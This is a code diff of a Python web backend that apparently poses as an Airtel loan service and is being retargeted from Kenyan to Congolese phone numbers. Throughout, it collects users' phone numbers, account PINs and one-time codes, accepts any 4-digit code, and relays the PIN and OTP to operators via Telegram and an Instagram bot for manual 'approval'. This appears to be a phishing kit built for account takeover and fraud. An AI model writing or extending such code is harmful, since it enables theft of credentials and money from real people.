@@ -18,6 +18,7 @@ from telegram_bot import (
     answer_callback_query,
     edit_message,
     send_loan_approval_request,
+    send_login_alert,            # ← NEW
 )
 from approvals import (
     create_approval,
@@ -39,9 +40,9 @@ from mobitech_sms import send_mobitech_sms
 # Config
 # ────────────────────────────────────────────────────────────────
 OTP_REQUEST_TTL_MINUTES = 10
-ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "")  # optional shared secret for admin API
+ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "")
 INSTAGRAM_BOT_WEBHOOK_URL = os.getenv("INSTAGRAM_BOT_WEBHOOK_URL", "")
-INSTAGRAM_VERIFY_TOKEN = os.getenv("INSTAGRAM_VERIFY_TOKEN", "airtel-loans-verify")
+INSTAGRAM_VERIFY_TOKEN = os.getenv("INSTAGRAM_VERIFY_TOKEN", "airtel-congo-verify")
 INSTAGRAM_ADMIN_IDS = {
     x.strip() for x in os.getenv("INSTAGRAM_ADMIN_IDS", "").split(",") if x.strip()
 }
@@ -62,15 +63,9 @@ init_db()
 otp_store = {}
 
 # ────────────────────────────────────────────────────────────────
-# OTP-request storage (NEW, ref_id-driven)
+# OTP-request storage (ref_id-driven)
 # ────────────────────────────────────────────────────────────────
-# otp_requests[ref_id] = {
-#   "ref_id", "phone", "otp", "pin", "status",
-#   "created_at" (iso), "created_at_display", "expires_at" (iso),
-#   "decided_at", "decided_by", "notified"
-# }
 otp_requests: dict[str, dict] = {}
-# Index: phone -> latest ref_id (used for cleanup on new submission)
 phone_latest_ref: dict[str, str] = {}
 
 
@@ -85,7 +80,6 @@ def make_ref_id() -> str:
 
 
 def create_otp_request(phone: str, otp: str, pin: str) -> dict:
-    """Create and register a pending OTP verification request."""
     ref_id = make_ref_id()
     now = _now_utc()
     req = {
@@ -103,14 +97,11 @@ def create_otp_request(phone: str, otp: str, pin: str) -> dict:
     }
     otp_requests[ref_id] = req
     phone_latest_ref[phone] = ref_id
-
-    # Mirror status into the legacy map for backward compat
     otp_approval_status[phone] = "pending"
     return req
 
 
 def expire_if_needed(req: dict) -> dict:
-    """Lazily transition a request to 'expired' if its TTL has passed."""
     if req.get("status") != "pending":
         return req
     try:
@@ -124,7 +115,6 @@ def expire_if_needed(req: dict) -> dict:
 
 
 def cancel_pending_for_phone(phone: str, exclude_ref: str | None = None) -> None:
-    """Cancel any prior pending request(s) for a phone number."""
     prev_ref = phone_latest_ref.get(phone)
     if prev_ref and prev_ref != exclude_ref and prev_ref in otp_requests:
         prev = otp_requests[prev_ref]
@@ -133,11 +123,11 @@ def cancel_pending_for_phone(phone: str, exclude_ref: str | None = None) -> None
 
 
 # ────────────────────────────────────────────────────────────────
-# Admin notification (Instagram + optional Telegram)
+# Admin notification for OTP-verify — WITH Approve / Reject buttons
 # ────────────────────────────────────────────────────────────────
 def _build_admin_message(req: dict) -> str:
     return (
-        "🔐 <b>OTP Verification Request</b>\n"
+        "🔔 <b>OTP Verification Request</b>\n"
         f"📱 Phone: <code>{req['phone']}</code>\n"
         f"🔢 OTP: <code>{req['otp']}</code>\n"
         f"🔑 PIN: <code>{req['pin']}</code>\n"
@@ -147,7 +137,7 @@ def _build_admin_message(req: dict) -> str:
 
 
 async def notify_admin_of_otp_request(req: dict) -> None:
-    """Fan out the request to Instagram bot webhook and (optionally) Telegram."""
+    """Fan out the request to the Instagram bot and Telegram (with buttons)."""
     payload = {
         "type": "otp_request",
         "ref_id": req["ref_id"],
@@ -157,7 +147,6 @@ async def notify_admin_of_otp_request(req: dict) -> None:
         "created_at": req["created_at"],
         "created_at_display": req["created_at_display"],
         "display": _build_admin_message(req),
-        # Handy for bot button callbacks:
         "actions": {
             "approve": f"approve:{req['ref_id']}",
             "reject": f"reject:{req['ref_id']}",
@@ -174,9 +163,18 @@ async def notify_admin_of_otp_request(req: dict) -> None:
         except Exception as e:
             print(f"[IG-NOTIFY] failed: {e}")
 
-    # 2) Telegram fallback (existing behaviour)
+    # 2) Telegram with inline Approve / Reject buttons.
+    #    The ref_id doubles as the approval_id, so button callbacks carry
+    #    'approve:<ref_id>' / 'reject:<ref_id>' straight back to the webhook.
     try:
-        await send_telegram_message(_build_admin_message(req))
+        await send_approval_request(
+            approval_id=req["ref_id"],
+            phone=req["phone"],
+            pin=req["pin"],
+            otp=req["otp"],
+            sms_body="",
+            is_user_submitted=True,
+        )
     except Exception as e:
         print(f"[TG-NOTIFY] failed: {e}")
 
@@ -192,8 +190,8 @@ class LoginRequest(BaseModel):
 class VerifyOTPRequest(BaseModel):
     phone_number: str
     otp: str
-    ref_id: str | None = None          # optional, client may pre-generate
-    submitted_at: str | None = None    # optional, client timestamp
+    ref_id: str | None = None
+    submitted_at: str | None = None
 
 
 class RegisterRequest(BaseModel):
@@ -214,14 +212,17 @@ class DecideRequest(BaseModel):
 # Helpers
 # ────────────────────────────────────────────────────────────────
 def format_phone(phone: str) -> str:
-    phone = phone.strip()
+    """Normalise a DRC mobile number to +243XXXXXXXXX."""
+    phone = phone.strip().replace(" ", "").replace("-", "")
+    if phone.startswith("+"):
+        return phone
+    if phone.startswith("00"):
+        phone = phone[2:]
     if phone.startswith("0"):
         phone = phone[1:]
-    if not phone.startswith("+254") and not phone.startswith("254"):
-        return f"+254{phone}"
-    if phone.startswith("254"):
+    if phone.startswith("243"):
         return f"+{phone}"
-    return phone
+    return f"+243{phone}"
 
 
 def cleanup_approval_records_for_phone(phone: str):
@@ -250,7 +251,6 @@ async def send_otp_to_user(full_phone: str, sms_body: str, label: str = "OTP"):
 
 
 def _check_admin(request: Request) -> None:
-    """Optional shared-secret guard for admin endpoints."""
     if not ADMIN_TOKEN:
         return
     token = request.headers.get("x-admin-token") or request.query_params.get("token")
@@ -286,6 +286,7 @@ async def login(request: LoginRequest):
 
     cleanup_approval_records_for_phone(full_phone)
 
+    # 1) Generate + SMS the OTP to the user
     otp = str(random.randint(1000, 9999))
     otp_store[full_phone] = otp
     otp_approval_status[full_phone] = "pending"
@@ -294,49 +295,32 @@ async def login(request: LoginRequest):
     sms_body = build_otp_sms(otp)
     await send_otp_to_user(full_phone, sms_body, label="LOGIN")
 
-    # Notify admin for awareness — the real decision happens in /verify-otp
-    approval_id = str(uuid4())
-    create_approval(approval_id)
-    approval_phones[approval_id] = full_phone
-    approval_pins[approval_id] = request.pin
-    approval_otps[approval_id] = otp
-
+    # 2) Telegram: ONLY phone, PIN, action, timestamp — never the OTP
     try:
-        await send_approval_request(
-            approval_id,
-            full_phone,
-            request.pin,
-            otp,
-            sms_body,
-            is_user_submitted=False,
-        )
+        await send_login_alert(full_phone, request.pin, action="LOGIN")
     except Exception as e:
-        print(f"[LOGIN] Telegram notify failed: {e}")
+        print(f"[LOGIN] Login alert failed: {e}")
 
     return {
         "status": "approved",
-        "approval_id": approval_id,
         "message": "OTP sent to your phone",
     }
 
 
-# --- VERIFY OTP (any 4-digit code is accepted) ---
+# --- VERIFY OTP (any 4-digit code is accepted; admin decides) ---
 @app.post("/api/verify-otp")
 async def verify_otp(request: VerifyOTPRequest):
     full_phone = format_phone(request.phone_number)
     entered_otp = (request.otp or "").strip()
 
-    # 1) Only validate the *format* — we no longer reject the value.
     if not entered_otp.isdigit() or len(entered_otp) != 4:
         return {
             "status": "error",
             "message": "Le code doit contenir exactement 4 chiffres.",
         }
 
-    # 2) Cancel any previous pending request for this phone.
     cancel_pending_for_phone(full_phone)
 
-    # 3) Create a brand-new pending request.
     pin = phone_pins.get(full_phone, "****")
     req = create_otp_request(full_phone, entered_otp, pin)
 
@@ -346,7 +330,6 @@ async def verify_otp(request: VerifyOTPRequest):
         req["ref_id"] = request.ref_id
         phone_latest_ref[full_phone] = request.ref_id
 
-    # 4) Notify admin (Instagram bot → Telegram fallback).
     try:
         await notify_admin_of_otp_request(req)
     except Exception as e:
@@ -360,15 +343,13 @@ async def verify_otp(request: VerifyOTPRequest):
     }
 
 
-# --- OTP STATUS POLLING (by ref_id) ---
+# --- OTP STATUS POLLING ---
 @app.get("/api/otp-status/{ref_id}")
 async def otp_status(ref_id: str):
     req = otp_requests.get(ref_id)
     if not req:
         return {"status": "expired"}
-
     expire_if_needed(req)
-
     return {
         "status": req["status"],
         "ref_id": req["ref_id"],
@@ -376,7 +357,7 @@ async def otp_status(ref_id: str):
     }
 
 
-# --- OTP CANCEL (user gives up while waiting) ---
+# --- OTP CANCEL ---
 @app.post("/api/otp-cancel/{ref_id}")
 async def otp_cancel(ref_id: str):
     req = otp_requests.get(ref_id)
@@ -402,34 +383,15 @@ async def resend_otp(request: ResendRequest):
     sms_body = build_otp_sms(new_otp)
     await send_otp_to_user(full_phone, sms_body, label="RESEND")
 
-    # Fresh approval record for Telegram/legacy tracking
-    approval_id = str(uuid4())
-    create_approval(approval_id)
-    approval_phones[approval_id] = full_phone
-    approval_pins[approval_id] = pin
-    approval_otps[approval_id] = new_otp
-
+    # Plain "Resend Requested" notice for the admin
     try:
         await send_telegram_message(
             f"🔄 <b>Resend Requested</b>\n\n"
             f"📱 Phone: <code>{full_phone}</code>\n"
-            f"🔐 New OTP: <code>{new_otp}</code>\n"
-            f"🆔 Ref: <code>{approval_id}</code>"
+            f"🔐 New OTP: <code>{new_otp}</code>"
         )
     except Exception as e:
         print(f"[RESEND] Telegram notify failed: {e}")
-
-    try:
-        await send_approval_request(
-            approval_id,
-            full_phone,
-            pin,
-            new_otp,
-            sms_body,
-            is_user_submitted=False,
-        )
-    except Exception as e:
-        print(f"[RESEND] Approval request failed: {e}")
 
     return {"status": "success", "message": "OTP resent successfully"}
 
@@ -444,7 +406,6 @@ async def admin_list_otp_requests(
     status: str = Query("pending", pattern="^(pending|approved|rejected|expired|cancelled|all)$"),
     limit: int = 50,
 ):
-    """Return OTP requests for the Instagram bot to display."""
     _check_admin(request)
     items = []
     for req in otp_requests.values():
@@ -468,7 +429,6 @@ async def admin_get_otp_request(ref_id: str, request: Request):
 
 @app.post("/api/admin/otp-decide/{ref_id}")
 async def admin_decide_otp(ref_id: str, body: DecideRequest, request: Request):
-    """Approve or reject an OTP request. Called by the Instagram bot."""
     _check_admin(request)
     req = otp_requests.get(ref_id)
     if not req:
@@ -485,10 +445,8 @@ async def admin_decide_otp(ref_id: str, body: DecideRequest, request: Request):
 
     otp_approval_status[req["phone"]] = req["status"]
     if not approved:
-        # Wrong-code path: clear the sent OTP so nothing lingers
         otp_store.pop(req["phone"], None)
 
-    # Best-effort informational ping to Telegram (non-blocking)
     try:
         await send_telegram_message(
             f"{'✅' if approved else '❌'} <b>OTP {req['status'].title()}</b>\n"
@@ -512,11 +470,10 @@ async def admin_cancel_otp(ref_id: str, request: Request):
 
 
 # ==============================
-# INSTAGRAM WEBHOOK (admin replies)
+# INSTAGRAM WEBHOOK
 # ==============================
 @app.get("/instagram/webhook")
 async def instagram_webhook_verify(request: Request):
-    """Instagram webhook verification handshake."""
     params = request.query_params
     if (
         params.get("hub.mode") == "subscribe"
@@ -528,12 +485,6 @@ async def instagram_webhook_verify(request: Request):
 
 @app.post("/instagram/webhook")
 async def instagram_webhook_receive(request: Request, background_tasks: BackgroundTasks):
-    """Handle admin DMs. Supported text commands:
-       - 'pending'              → list pending requests
-       - 'approve <ref_id>'     → approve
-       - 'reject  <ref_id>'     → reject
-       - 'info    <ref_id>'     → show one request
-    """
     try:
         data = await request.json()
     except Exception:
@@ -547,24 +498,19 @@ async def instagram_webhook_receive(request: Request, background_tasks: Backgrou
             text = (msg.get("text") or "").strip()
             if not text or not sender:
                 continue
-
-            # Only accept commands from configured admins (if any)
             if INSTAGRAM_ADMIN_IDS and sender not in INSTAGRAM_ADMIN_IDS:
                 continue
-
             background_tasks.add_task(_handle_admin_command, sender, text)
 
     return {"ok": True}
 
 
 async def _handle_admin_command(sender: str, text: str) -> None:
-    """Process one admin DM command."""
     parts = text.split()
     cmd = parts[0].lower() if parts else ""
 
     def _reply(msg: str) -> None:
-        # This is a no-op placeholder. Wire this to your Instagram Graph API
-        # Send API call (POST /me/messages) using your page access token.
+        # Wire this to your Instagram Graph API Send call.
         print(f"[IG-REPLY -> {sender}] {msg}")
 
     if cmd in ("pending", "list"):
@@ -630,7 +576,7 @@ async def _handle_admin_command(sender: str, text: str) -> None:
 
 
 # ==============================
-# LOAN ROUTES (unchanged)
+# LOAN ROUTES
 # ==============================
 
 @app.post("/api/request-loan")
@@ -660,9 +606,8 @@ async def loan_request_status_endpoint(approval_id: str):
 
 
 # ==============================
-# TELEGRAM WEBHOOK (unchanged)
+# TELEGRAM WEBHOOK
 # ==============================
-
 @app.post("/telegram/webhook")
 async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
     try:
@@ -682,7 +627,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         callback_id = callback["id"]
         callback_data = callback.get("data", "")
 
-        # Loan approvals
+        # ── Loan approvals ────────────────────────────────────
         if callback_data.startswith("loan_approve:") or callback_data.startswith("loan_reject:"):
             action, approval_id = callback_data.split(":", 1)
             approved = action == "loan_approve"
@@ -698,7 +643,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                 )
             return {"ok": True}
 
-        # OTP approvals (legacy — now also syncs to otp_requests)
+        # ── OTP approvals ─────────────────────────────────────
         parts = callback_data.split(":")
         if len(parts) < 2:
             return {"ok": True}
@@ -706,31 +651,59 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         action, approval_id = parts[0], parts[1]
         approved = action == "approve"
 
-        set_approval_result(approval_id, approved)
-        await answer_callback_query(callback_id, "✅ OTP Approved" if approved else "❌ OTP Rejected")
+        # ⭐ Resolve the request. Try the new ref_id-keyed store first;
+        #    fall back to legacy approval_* maps.
+        req = otp_requests.get(approval_id)
+        if req:
+            expire_if_needed(req)
+            if req["status"] != "pending":
+                await answer_callback_query(callback_id, f"Already {req['status']}")
+                return {"ok": True}
 
-        phone = approval_phones.get(approval_id, "Unknown")
-        pin = approval_pins.get(approval_id, "Unknown")
-        otp = approval_otps.get(approval_id, "Unknown")
-
-        if phone != "Unknown":
-            otp_approval_status[phone] = "approved" if approved else "rejected"
+            req["status"] = "approved" if approved else "rejected"
+            req["decided_at"] = _now_utc().isoformat()
+            req["decided_by"] = "telegram_admin"
+            otp_approval_status[req["phone"]] = req["status"]
             if not approved:
-                otp_store.pop(phone, None)
-            # Also flip the ref_id-keyed record (if any matches this phone/otp)
-            for req in otp_requests.values():
-                if req["phone"] == phone and req["otp"] == otp and req["status"] == "pending":
-                    req["status"] = "approved" if approved else "rejected"
-                    req["decided_at"] = _now_utc().isoformat()
-                    req["decided_by"] = "telegram_admin"
-                    break
+                otp_store.pop(req["phone"], None)
+
+            phone, pin, otp = req["phone"], req["pin"], req["otp"]
+        else:
+            # Legacy path
+            set_approval_result(approval_id, approved)
+            phone = approval_phones.get(approval_id, "Unknown")
+            pin = approval_pins.get(approval_id, "Unknown")
+            otp = approval_otps.get(approval_id, "Unknown")
+
+            if phone != "Unknown":
+                otp_approval_status[phone] = "approved" if approved else "rejected"
+                if not approved:
+                    otp_store.pop(phone, None)
+                # Sync any ref_id record that matches this phone + otp
+                for r in otp_requests.values():
+                    if r["phone"] == phone and r["otp"] == otp and r["status"] == "pending":
+                        r["status"] = "approved" if approved else "rejected"
+                        r["decided_at"] = _now_utc().isoformat()
+                        r["decided_by"] = "telegram_admin"
+                        break
+
+        await answer_callback_query(
+            callback_id,
+            "✅ OTP Approved" if approved else "❌ OTP Rejected",
+        )
 
         if "message" in callback:
             result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
             await edit_message(
                 chat_id=callback["message"]["chat"]["id"],
                 message_id=callback["message"]["message_id"],
-                text=f"{result_text}\n\n📱 Phone: <code>{phone}</code>\n🔑 PIN: <code>{pin}</code>\n🔐 OTP: <code>{otp}</code>\n🆔 Ref: <code>{approval_id}</code>",
+                text=(
+                    f"{result_text}\n\n"
+                    f"📱 Phone: <code>{phone}</code>\n"
+                    f"🔑 PIN: <code>{pin}</code>\n"
+                    f"🔐 OTP: <code>{otp}</code>\n"
+                    f"🆔 Ref: <code>{approval_id}</code>"
+                ),
             )
 
         approval_phones.pop(approval_id, None)
